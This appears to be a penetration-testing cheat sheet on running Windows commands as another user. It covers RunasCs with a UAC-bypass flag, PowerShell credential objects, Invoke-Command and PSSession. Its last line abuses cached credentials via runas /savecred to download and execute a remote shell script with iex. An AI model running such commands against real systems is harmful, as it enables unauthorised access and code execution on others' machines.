---
title: "Runas"
date: 2024-7-10
tags: ["Powershell", "Credential Object", "Windows", "Runas"]
---

### RunasCS

```console
.\RunasCs.exe '<USER>' '<PASSWORD>' "<CMD>" -l <LOGON_TYPE>
```

```console
# Or
.\RunasCs.exe '<USER>' '<PASSWORD>' --bypass-uac "<CMD>" -l <LOGON_TYPE>
```

<br>

```console
2  Interactive
3  Network
4  Batch
5  Service
7  Unlock
8  NetworkCleartext
9  NewCredentials
10 RemoteInteractive
11 CachedInteractive
```

### Create credential object

{{< tab set1 tab1 >}}Method #1{{< /tab >}}
{{< tab set1 tab2 >}}Method #2{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = '<PASSWORD>'
```

```console
$secstr = New-Object -TypeName System.Security.SecureString
```

```console
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
```

{{< /tabcontent >}}

### Runas (with cred object)

{{< tab set2 tab1 >}}Invoke-Command{{< /tab >}}
{{< tab set2 tab2 >}}PSSession{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
# Set computer to localhost if running locally
Invoke-Command -ScriptBlock { <CMD> } -Credential $cred -Computer <COMPUTER_NAME>
```

```console
# If error, try
Invoke-Command -ScriptBlock { <CMD> } -Credential $cred -Computer <COMPUTER_NAME> -auth credssp
```

```console
# Invoke command with config
Invoke-Command -ScriptBlock { <CMD> } -Credential $cred -Computer <COMPUTER_NAME> -ConfigurationName config_name
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
new-pssession -computername . -credential $cred
```

```console
# Switch to new session
enter-pssession 1
```

{{< /tabcontent >}}

### Runas (with cache creds)

#### Check cache creds

```console
cmdkey /list
```

#### Run Command

```console
# e.g. Upload and run a shell
runas /user:<DOMAIN>\<USER> /savecred "powershell iex(new-object net.webclient).downloadstring('http://<LOCAL_IP>/shell.ps1')"
```
